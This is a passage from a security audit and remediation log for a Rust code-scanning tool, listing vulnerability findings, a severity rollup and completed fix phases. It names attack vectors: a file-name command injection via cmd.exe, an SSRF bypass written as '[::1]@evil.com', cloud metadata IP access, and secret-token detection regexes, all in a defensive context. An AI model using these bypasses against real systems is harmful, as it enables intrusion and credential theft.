- **Root Cause:** (1) `secret_token_pack()` registers DigitalOcean v1 tokens twice (`do[por]_v1_[0-9a-f]{64}` at line 109 and `dop_v1_...|doo_v1_...|dor_v1_...` at line 317), emitting two duplicate `CRITICAL` findings per token. (2) Line 972–973 skips any line starting with `r"` or `r#"`, missing real hardcoded secrets placed inside Rust raw string literals.
- **Surgical Fix:** Remove the duplicate entry at line 317 and narrow raw-string skipping to regex-construction contexts rather than all lines starting with `r"`/`r#"`.

### 10.1 Findings (P1–P2)

#### P1 — Supply-Chain, Installer Integrity, Symlink/Temp-File & Windows Command Injection

##### [F10-01] `P1` — CI/CD Supply-Chain Gaps & Root `src/` Dogfood Self-Scan Blindspot
- **Location:** `.github/workflows/ci.yml:1-33`; `.github/workflows/release.yml:1-106`
- **Root Cause:** (1) `ci.yml` omits a top-level `permissions: { contents: read }` block (inheriting default `GITHUB_TOKEN` permissions on `pull_request`), pins `actions/checkout@v4` and `dtolnay/rust-toolchain@stable` by mutable tags instead of 40-char commit SHAs, and runs its dogfood self-scan (`ci.yml:32`) on `crates` only — skipping the entire root `src/` directory (~12,000+ LOC of `mcp.rs`, `oci_image.rs`, `proxy.rs`, `dast_audit.rs`, `templates_audit.rs`, `idor_audit.rs`, `tls_audit.rs`, `sqli_audit.rs`, `live_verify.rs`, `lib.rs`). (2) `release.yml` references all 5 actions (including third-party `softprops/action-gh-release@v2` under `contents: write`) via mutable tags and publishes `SHA256SUMS.txt` without SLSA provenance (`actions/attest-build-provenance`) or Cosign signatures.
- **Surgical Fix:** Add explicit least-privilege `permissions: { contents: read }` in `ci.yml`, pin every GitHub Action to full commit SHAs, change the dogfood self-scan target from `crates` to `.` (scanning both `src/` and `crates/`), and add `actions/attest-build-provenance` to `release.yml`.

##### [F10-02] `P1` — `install.ps1` Missing-Checksum Downgrade Fallback & Direct Extraction into `PATH`
- **Location:** `install.ps1:59-72`
- **Root Cause:** When `SHA256SUMS.txt` does not contain an entry for the Windows zip archive, `install.ps1:60` throws a generic `RuntimeException` rather than `[System.Security.SecurityException]`. The generic `catch` block (`install.ps1:71-73`) swallows it and silently falls back to `Install-FromSource` (building unpinned `main` HEAD from GitHub) instead of aborting. Additionally, `install.ps1:67` calls `Expand-Archive` directly into `InstallDir` (user `PATH`) rather than staging in `TmpDir` and copying only the expected executables.
- **Surgical Fix:** Throw `[System.Security.SecurityException]` on missing checksum entries so execution aborts identically to a hash mismatch, and extract into `TmpDir` first before copying only `smg.exe` and `shellmind-guard.exe` into `InstallDir`.

##### [F10-03] `P1` — Predictable World-Readable `/tmp/smg-proxy-{id}.txt` Export & Unprotected `/tmp` Temp Directories
- **Location:** `crates/smg-tui/src/proxy_tui.rs:870-885`; `crates/smg-ai/src/codemods.rs:325`; `crates/smg-ai/src/lib.rs:947`; `crates/smg-sandbox/src/bwrap.rs:493, 1151`
- **Root Cause:** (1) Pressing `e` in `proxy_tui.rs:870` exports captured HTTP requests and responses (including `Authorization` headers, cookies, and tokens) to hardcoded `/tmp/smg-proxy-{entry.id}.txt` using `std::fs::write` with default umask (world-readable on typical Linux hosts, vulnerable to `/tmp` symlink-clobber attacks, and broken on Windows where `/tmp/` does not exist). (2) `codemods.rs:325`, `smg-ai/src/lib.rs:947`, and `bwrap.rs:493, 1151` construct predictable `std::env::temp_dir().join(format!("smg-...-{pid}-{seq}"))` paths without `O_EXCL` or random entropy.
- **Surgical Fix:** Use a securely created per-user directory (`0700`) or `tempfile::Builder::new().rand_bytes(12)` with `0600` permissions on Unix for proxy exports and all temporary build/probe directories.

##### [F10-04] `P1` — Windows `cmd /C start` Shell Metacharacter Injection on File Open
- **Location:** `crates/smg-tui/src/lib.rs:3435-3441`
- **Root Cause:** On Windows, opening a file from the TUI executes `Command::new("cmd").args(["/C", "start", ""]).arg(path)`. Because `cmd.exe /C` parses shell metacharacters (`&`, `|`, `^`, `%VAR%`, `>`), scanning a repository containing a specially named file and opening it from the TUI can trigger arbitrary command execution.
- **Surgical Fix:** Replace `cmd /C start` on Windows with `ShellExecuteW` (or `explorer.exe` with validated canonical path) without invoking `cmd.exe`.

#### P2 — Installer Hardening & Nested History Hygiene

##### [F10-05] `P2` — Installer TLS Hardening, Unpinned `--version` Source Fallback & Unescaped `grep` Pattern
- **Location:** `install.sh:50, 70, 74, 87`; `install.ps1:26, 56`
- **Root Cause:** Neither installer enforces TLS 1.2+ (`curl --proto '=https' --tlsv1.2`; `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`), neither forwards a user-specified `--version` tag to `cargo install --git ... --tag` during source fallback (silently installing `HEAD`), and `install.sh:74` uses unescaped regex `grep` (where `.` matches any character) plus `tar -xzf` without `--no-same-owner`.
- **Surgical Fix:** Enforce HTTPS + TLS 1.2+ in both installers, pass `--tag` when `VERSION != "latest"`, match exact filenames with `awk -v a="..." 'NF>=2 && $2==a {print $1}'` (or `grep -F`), and pass `--no-same-owner` to `tar`.

##### [F10-06] `P2` — Subdirectory `.shellmind-guard/audit-history.jsonl` Sprawl
- **Location:** `.shellmind-guard/audit-history.jsonl`, `crates/.shellmind-guard/`, `src/.shellmind-guard/`, `crates/smg-{enterprise,hw,pqc,web3}/.shellmind-guard/` (7 nested directories)
- **Root Cause:** Running `smg scan <subdir>` writes `audit-history.jsonl` relative to the target subdirectory instead of resolving the workspace/git root, littering nested `.shellmind-guard/` folders across crate subdirectories.
- **Surgical Fix:** Resolve the nearest `.git` / workspace root (falling back to the target directory) before creating `.shellmind-guard/audit-history.jsonl`.

---

## Final Master Audit Rollup — ShellMind-Guard (`AUDIT 1.1`)

### Overall Coverage & Severity Breakdown

| Form | Scope | Files Audited | LOC Audited | P0 | P1 | P2 | P3 | Total |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
| **Form 1** | `crates/smg-core` (Config, Scanner, Cache, OSV, YAML) | 6 | 2,462 | 1 | 7 | 7 | 4 | **19** |
| **Form 2** | `crates/smg-graph` (2A–2D: Graph, Taint, AST, Detectors) | 27 | 30,596 | 10 | 42 | 19 | 11 | **82** |
| **Form 3** | `crates/smg-graph/src/smt.rs` (Pure-Rust SMT Solver) | 1 | 1,300 | 4 | 3 | 2 | 1 | **10** |
| **Form 4** | `crates/smg-graph` (4A–4B + `secrets_config.rs` Addendum) | 18/18 | 17,805 | 4 | 19 | 8 | 2 | **33** |
| **Form 5** | `smg-web3`, `smg-hw`, `smg-pqc`, `smg-enterprise` | 16 | 13,184 | 10 | 16 | 2 | 0 | **28** |
| **Form 6** | `smg-sandbox` & `smg-ai` | 6 | 7,792 | 4 | 6 | 0 | 0 | **10** |
| **Form 7** | `smg-report`, `smg-tui`, Root CLI/MCP/OCI/Deps | 13 | 14,725 | 5 | 8 | 3 | 0 | **16** |
| **Form 8** | Repo-Wide Hardening Gate (`Cargo.toml`, `Cargo.lock`, 92 `.rs`) | All 11 crates | Repo-wide | 0 | 2 | 3 | 0 | **5** |
| **Form 9** | Live HTTP, TLS, Proxy, DAST, SQLi, IDOR & Templates | 8 | 7,314 | 4 | 7 | 3 | 0 | **14** |
| **Form 10** | Full-Repo Gap Sweep (CI/CD, Installers, Plugins, Temp/Shell) | 50 non-Rust + sweep | Repo-wide | 0 | 4 | 2 | 0 | **6** |
| **TOTAL** | **100% Coverage — All 11 Crates & All 145/145 Repo Files** | **92/92 `.rs` + 50 non-Rust** | **~95,178 Rust** | **42** | **114** | **49** | **18** | **223** |

> *100% Coverage Verified: Every single one of the 92 production Rust source files across all 11 workspace crates, the 2,836-LOC adversarial benchmark suite, and all 50 non-Rust CI/CD, installer, plugin, manifest, and configuration files have been read and audited.*

### Prioritized P0 Remediation Roadmap (Top Systemic Clusters — 42 P0 Findings)

1. **SSRF, Loopback Guardrail & Sandbox Isolation Bypasses (Fix First — Immediate Security Impact):**
   - `F1-01` (`smg-core/src/config.rs`): IPv6 `[::1]@evil.com` loopback bypass.
   - `F9-01` (`src/idor_audit.rs`): `v4.is_link_local()` permits cloud IMDS `169.254.169.254` across 5 live audit subcommands.
   - `F9-02` (`src/templates_audit.rs`, `src/http_audit.rs`): Absolute template URLs, redirects, `network.host`, and `--graphql` bypass lab guardrail.
   - `F6-01` / `F6-02` (`smg-sandbox`): Sandbox container/exec isolation and path/command boundary gaps.
   - `F7-01` / `F7-02` (`src/mcp.rs`, `src/oci_image.rs`): MCP path/workspace containment and OCI layer archive extraction/integer-overflow hardening.

2. **Panic / Crash & Memory-Exhaustion DoS on Untrusted Inputs:**
   - `F9-03` (`dast_audit`, `templates_audit`, `idor_audit`, `http_audit`, `sqli_audit`, `live_verify`): Unbounded `resp.bytes()?` / `resp.text()` before 2 MiB cap.
   - `F9-04` (`src/proxy.rs`): Unbounded thread-per-connection and half-closed `CONNECT` tunnel thread/socket deadlock.
   - `F2-*` / `F4-*` / `F5-*`: UTF-8 byte-index slicing panics, unchecked recursion/stack overflow on crafted AST/Solidity/Verilog/ASN.1 inputs, and `O(N^2)` amplification paths.

3. **Formal Verification, SMT & Security-Analysis Soundness:**
   - `F3-01`–`F3-04` (`smg-graph/src/smt.rs`): SMT solver soundness breaks (false SAT/UNSAT on bitvector/linear-arithmetic constraints).
   - `F5-*` (`smg-web3`, `smg-hw`, `smg-pqc`, `smg-enterprise`): Cryptographic/X.509/ASN.1/Web3/Verilog parser and policy-evaluator soundness breaks.
   - `F9-05`–`F9-10` (`templates_audit.rs`, `dast_audit.rs`, `sqli_audit.rs`): DSL `all || any` inversion, dropped multi-request blocks, SSTI baseline-free FPs, and POST SQLi param extraction.

4. **Workspace-Wide Hardening Gate (`Form 8`):**
   - Enable `[workspace.lints.rust] unsafe_code = "forbid"` across all 10 pure-safe crates (`F8-01`).
   - Bound all untrusted regex compilations with `RegexBuilder::size_limit` / `dfa_size_limit` (`F8-02`).
   - Eliminate the final 7 production `.unwrap()` calls and library `std::process::exit(130)` (`F8-03`), and evaluate `overflow-checks = true` in `[profile.release]` (`F8-04`).

---

## Appendix A — Unified Merge from `AUDIT_1.2.md` (15 Independently Verified Unique Findings)

> **Purpose (Phase 0):** Every unique high-signal finding from the independent `AUDIT_1.2.md` run was verified line-by-line against live source code in `/home/km-abdullah/ShellMind-Guard` and merged here so the remediation backlog is a single, lossless source of truth (**223 + 15 = 238 unique findings: 42 P0 · 121 P1 · 57 P2 · 18 P3**).

### Verified Merged Findings (`M-01` – `M-15`: 0 P0 · 7 P1 · 8 P2)

- **`[M-01]` `P1` (src: `RUN4A-02`) — Raw Token Leak via `reqwest::Error` Display URL (`src/live_verify.rs:324-376, 643-651`):** `AuthStyle::QueryKey` and `TelegramGetMe` place raw secrets in the URL; on network failure `format!("network error: {e}")` embeds the full URL (including raw token) into `f.title` and exported SARIF/JSON. **Fix:** Strip ` for url (...)` / format sanitized error kinds without URLs.
- **`[M-02]` `P1` (src: `RUN7A-02`) — File-Move Evasion Certifies False `MITIGATED` (`crates/smg-ai/src/lib.rs:924-940`):** `finding_still_present` requires `f.file == target.file`; an AI refactor moving a vulnerable sink from `a.ts` to `b.ts` passes static verification as `MITIGATED`. **Fix:** Require global absence / strict count reduction of `(rule_id, sink_kind)` across the post-scan graph.
- **`[M-03]` `P1` (src: `RUN7A-01`) — `--ci --watch` Unreachable Exit Gate (`src/lib.rs:2263-2407`):** `should_fail_gate` runs after the infinite `watch` loop; `smg scan . --ci --watch` never exits non-zero. **Fix:** Evaluate gate on initial scan and exit `ExitCode::from(2)` on failure when `ci || fail_on.is_some()`.
- **`[M-04]` `P1` (src: `RUN10-01`) — Unbounded Expression-Tree Recursion in `taint.rs` & `deep_stack.rs` (`crates/smg-graph/src/taint.rs:1465-2162, 3198-3456, 4748`; `deep_stack.rs:523`):** `MAX_AST_WALK_DEPTH` caps statement blocks only; expression walkers (`ast_eval_masks`, `expr_call_sanitized_bits`, `is_pure_safe_literal_expr`, `scan_frontend_ast`) recurse unboundedly on deeply nested sink arguments. **Fix:** Thread `depth: usize` capped at `MAX_AST_WALK_DEPTH` (512).
- **`[M-05]` `P1` (src: `RUN7B-03`) — Background-Thread Panic Tears Down Live TUI Terminal (`crates/smg-tui/src/lib.rs:304-320, 2428-2445`):** Global panic hook disables raw mode / alt-screen on any background worker panic while `start_bg_job` lacks `catch_unwind`, corrupting the live TUI and dropping the error silently. **Fix:** Wrap worker closures in `catch_unwind` and gate terminal teardown on main-thread ID.
- **`[M-06]` `P1` (src: `RUN9-06`) — SQLi Time-Based Verdict Fires on Timeout Artifacts + Max-of-2 Median Bias (`src/sqli_audit.rs:291-297, 465-480`):** `let _ = send_probe(payload);` discards errors yet records ~26s timeout elapsed time as SQLi delay evidence, amplified by 2-sample `median_f64` returning `samples[1]` (max). **Fix:** Reject `Err` samples as `INCONCLUSIVE`, use >=4 samples with true median and min-sample floor.
- **`[M-07]` `P1` (src: `RUN9-14`/`RUN9-15`) — Proxy TUI Replay Panic on Malformed Headers, No Panic Hook & Credential-Leaking Redirects (`crates/smg-tui/src/proxy_tui.rs:147-165, 715-942, 838-842`):** `req.header(k, v)` panics on invalid captured headers (leaving terminal stuck in raw mode), and the replay client uses default redirect following (up to 10 hops) while resending captured `Authorization`/`Cookie` headers. **Fix:** Use `HeaderName`/`HeaderValue::try_from`, install a `TerminalGuard` panic hook, and set `Policy::none()`.
- **`[M-08]` `P2` (src: `RUN7A-03`) — Broken Symlink Aborts `copy_workspace_filtered` (`crates/smg-ai/src/lib.rs:904-915`):** `entry.metadata()?` runs before `entry.file_type()?.is_symlink()`, failing `--apply-check`/CEGIS on repos with any dangling symlink. **Fix:** Check `entry.file_type()?.is_symlink()` before `metadata()`.
- **`[M-09]` `P2` (src: `RUN7B-01`) — MCP 32 KiB Budget Missing on `explain_finding` & Inner-Only Measurement (`src/mcp.rs:354-435, 482-488`):** `shellmind_guard_explain_finding` has no size cap, and `scan` measures inner JSON prior to outer JSON-RPC escaping. **Fix:** Enforce budget on serialized outer envelope across all tools.
- **`[M-10]` `P2` (src: `RUN7B-02`) — CycloneDX VEX `affects.ref` Substring Misattribution (`crates/smg-report/src/lib.rs:303-315`):** `f.title.contains(&d.name)` attributes `admin@2.0` to a dependency named `min`. **Fix:** Match structured package name+version tokens instead of raw substring containment.
- **`[M-11]` `P2` (src: `RUN9-08`) — Proxy TUI `max()+1` ID Collision Race with Engine `AtomicU64` (`crates/smg-tui/src/proxy_tui.rs:337-356`):** Concurrent replays and proxy captures generate duplicate entry IDs, clobbering exports and compare/replay lineage. **Fix:** Share `next_id: Arc<AtomicU64>` from `ProxyHandle`.
- **`[M-12]` `P2` (src: `RUN10-05`) — TEE Optional Transcript Binding (`crates/smg-enterprise/src/tee.rs:400-432`):** `request_blake3_hex` and `findings_blake3_hex` are skipped when `None`, allowing a valid quote to wrap foreign/stale findings. **Fix:** Require both hashes by default (populate in `sign_tee_quote`).
- **`[M-13]` `P2` (src: `RUN10-06`) — `SMG-HW-BOOT` Over-Broad `wc_`/`mcuboot_`/`bootutil_` Signature Credit (`crates/smg-hw/src/typestate_irq.rs:1125-1150`):** Non-verification calls like `wc_InitRng` suppress CRITICAL missing-signature boot findings. **Fix:** Restrict credit to explicit verification APIs (`wc_SignatureVerify`, `bootutil_img_validate`, `mbedtls_pk_verify`, etc.).
- **`[M-14]` `P2` (src: `RUN2-16`) — Scanner Classification Gaps for `.envrc`, Extensionless SSH Keys & Lockfiles (`crates/smg-core/src/scanner.rs:63-150`):** `.envrc`, `id_rsa`/`id_ed25519`/`id_ecdsa`, `npm-shrinkwrap.json`, `deno.lock`, `rebar.lock` are omitted from indexing/manifest classification. **Fix:** Add explicit filename matches in `Language::from_path`.
- **`[M-15]` `P2` (src: `RUN2-17`/`18`/`19`) — `smg-core` Cache Cross-Clobber, `state.db` Umask Permissions & Unbounded `cached_bytes` RSS (`crates/smg-core/src/store.rs:45-60, 205-220`; `scanner.rs:455-465`):** Concurrent scans wipe each other's delta cache rows, `state.db` is created with default umask permissions, and `cached_bytes` retains all <=256 KiB files with no global RAM cap. **Fix:** Add advisory lock / set-based delete, `0700`/`0600` Unix permissions, and a global 256 MiB `cached_bytes` budget.

---

## 8-Phase Remediation Execution Tracker

- [x] **Phase 0 — Unified Backlog Lock (`AUDIT_1.1` + `AUDIT_1.2` Merge):** Verified all 15 unique catches from `AUDIT_1.2.md` against live code and locked the unified 238-finding backlog.
- [x] **Phase 1 — Core Foundation & Security Perimeter (`crates/smg-core`):** Fixed `F1-01`..`F1-19` + `M-14`/`M-15` across `config.rs`, `yaml.rs`, `advisories.rs`, `scanner.rs`, `store.rs`; verified with `cargo clippy -p smg-core --all-targets -- -D warnings` (0 warnings) and `cargo test -p smg-core` (11/11 passed).
- [x] **Phase 2 — Crash/DoS Elimination & Graph/SMT Soundness (`smg-graph` Core):** Fixed `smt.rs` UTF-8 char-boundary panic, collision-free SMT-LIB2 ident bijection, literal-stripped exit checks, external z3 deadline/reaping & bounded Or splitting; capped unbounded recursion in `scope.rs`, `ast.rs`, `taint.rs`, `deep_stack.rs`; fixed `cfg.rs` budget-exhausted fallback & literal-stripped exit checks, `scope.rs` negated XSS sanitizer check, `lattice.rs` CHA truncation soundness / `O(1)` static-finding dedup / wildcard prefix routes, `deep_stack.rs` post-sink guard bypass, and `call_hierarchy.rs` `MAX_WALK_DEPTH = 512`; verified with `cargo clippy -p smg-graph --lib -- -D warnings` (0 warnings) and `cargo test -p smg-graph --lib` (80/80 passed).
- [x] **Phase 3 — Extractors, Secrets, Deps & IaC Engines (`smg-graph` Engines):** Fixed `secrets_config.rs` (`O(N^2)` `.sign(` reallocation, string-aware `#[cfg(test)]` tracker, exact SOPS footer keys, `.gitignore` directory-prefix matching, duplicate DigitalOcean rule + legacy OpenAI `sk-...T3BlbkFJ...` detection), `gitleaks_config.rs` bounded `RegexBuilder` (`256 KiB`), `git_history.rs` octal path unquoting, `phase10.rs` word-bounded positive-bound checks & OpenAPI provenance preservation, `infra_dos.rs` zero-copy multi-doc YAML slicing, and `deps.rs` `npm-shrinkwrap.json`/`mix.lock` routing; verified with `cargo clippy -p smg-graph --lib -- -D warnings` (0 warnings) and `cargo test -p smg-graph --lib` (80/80 passed).
- [x] **Phase 4 — Specialist Engines (`smg-web3`, `smg-hw`, `smg-pqc`, `smg-enterprise`):** Fixed `smg-web3` (`link_library_placeholders` UTF-8 panic, `.send()` false-positive reentrancy, ERC-7201 UTF-8 lookback, `SOLVENCY_BREACH` false `Proven` downgrade, confidence-aware dedup), `smg-hw` (`SMG-HW-BOOT` strict verification-API allowlist), `smg-pqc` (dynamic `SystemTime` current year in `x509.rs`, removed `.unwrap()` in `inventory.rs:272`), and `smg-enterprise` (mandatory cryptographic `request_blake3_hex` & `findings_blake3_hex` transcript binding + `sign_tee_quote_with_transcript`); verified with `cargo clippy` (0 warnings) and `cargo test` (30/30 passed across all 4 crates).
- [x] **Phase 5 — Sandbox Isolation, AI Patcher & OCI/Live-Verify (`smg-sandbox`, `smg-ai`, `src/{oci_image,live_verify,deps_sync}.rs`):** Fixed `live_verify.rs` (stripped URLs from `reqwest::Error` Display preventing raw Google/Telegram token leaks `M-01`, 256 KiB bounded HTTP reads `F9-03`, JSON-parsed Slack `ok` check & canonical repo containment `F9-13`), `oci_image.rs` (256 MiB bounded `maybe_gunzip` with kill/reap preventing gzip-bomb OOM `RUN4A-01`, POSIX PAX/`@LongLink` support `RUN4A-03`, OCI-layout `blobs/sha256/` magic sniffing `RUN4A-04`, saturating `size + 511` `RUN4A-05`, nested-tar depth cap `RUN4A-06`), `smg-ai` (`finding_still_present` file-move evasion fix `M-02`, broken-symlink `file_type()` check `M-08`, `0700` private `/tmp` workspaces excluding sensitive files `F10-03`, Drop-guarded syntax temp cleanup `RUN7A-06`), and `smg-sandbox` (`drain_pipe` continuous drain preventing SIGPIPE `RUN6-09`); verified with `cargo clippy` (0 warnings) and `cargo test` (`smg-ai`: 6/6, `smg-sandbox`: 20/20, `oci_image`+`live_verify`: 5/5).
- [x] **Phase 6 — Live HTTP/Proxy/DAST/SQLi/Templates + CLI/TUI/MCP/Report:** Fixed `idor_audit.rs` (blocked `169.254.169.254` IMDS link-local bypass `F9-01`, 2 MiB bounded read), `http_audit.rs` (`graphql_endpoint` scope check `F9-02`, 2 MiB bounded OpenAPI/GraphQL reads `F9-03`), `dast_audit.rs` (2 MiB bounded read, deduped `Location:` header, baseline `"49"` SSTI guard `F9-09`), `sqli_audit.rs` (2 MiB bounded read, removed 1-byte `body_diverges` false-positive, ignored timeout errors in time-based loop `M-06`), `proxy.rs` (60s idle timeout + symmetric `Shutdown::Both` preventing tunnel deadlock `F9-04`), `templates_audit.rs` (redirect scope policy & conditional TLS cert verification `F9-02`/`F8-05`, CRLF-safe raw request parsing & header quote strip `F9-07`, DSL `condition:` + 256 KiB `RegexBuilder` `F9-05`/`F8-02`, DNS label slice/fallback `F9-08`, removed `.unwrap()` `F8-03`), `src/lib.rs` (`--ci --watch` exit gate `M-03`), `src/mcp.rs` (32 KiB budget on `explain_finding` + outer envelope `M-09`), `smg-report` (token-bounded CycloneDX VEX `affects.ref` matching `M-10`), `smg-tui/src/lib.rs` (`catch_unwind` in `start_bg_job` `M-05`, shell-free `explorer.exe` on Windows `F10-04`), and `smg-tui/src/proxy_tui.rs` (`HeaderName`/`HeaderValue` validation, bounded read, `Policy::none()`, panic-safe `ProxyTerminalGuard`, private `0700`/`0600` exports `M-07`/`M-11`/`F10-03`); verified with `cargo clippy` (0 warnings) and `cargo test` (`smg-report`: 3/3, `smg-tui`: 14/14, `shellmind-guard`: 58/58).
- [x] **Phase 7 — Workspace Hardening, CI/CD, Installers & Final Precision Gate:** Enforced `[workspace.lints]` (`unsafe_code = "forbid"`, `todo = "deny"`, `unimplemented = "deny"`) across all 10 pure-safe crates (and clippy `todo`/`unimplemented` denies on `smg-sandbox`) (`F8-01`); enabled `overflow-checks = true` in `[profile.release]` (`F8-04`); removed remaining production `.unwrap()` calls in `smg-graph/{taint.rs,phase9/mobile.rs}` (`F8-03`); hardened `.github/workflows/{ci,release}.yml` with least-privilege `permissions: { contents: read }`, verified 40-char commit SHA pinning on all actions, full-repo `.` dogfood self-scan, and `actions/attest-build-provenance` SLSA provenance (`F10-01`); hardened `install.sh` & `install.ps1` with TLS 1.2+, pinned `--tag` source fallback, exact checksum matching, fail-closed `SecurityException` on missing Windows checksums, staged archive extraction, and `--no-same-owner` (`F10-02`/`F10-05`); anchored `audit-history.jsonl` to nearest `.git` root & removed stray nested `.shellmind-guard/` dirs (`F10-06`); verified `cargo fmt --all -- --check`, `cargo clippy --workspace --all-targets -- -D warnings` (0 warnings across all 11 crates), `cargo test -p smg-graph --lib` (80/80), and `SMG_ENFORCE_PRECISION_GATE=1 cargo test -p shellmind-guard --lib --no-default-features` (58/58).


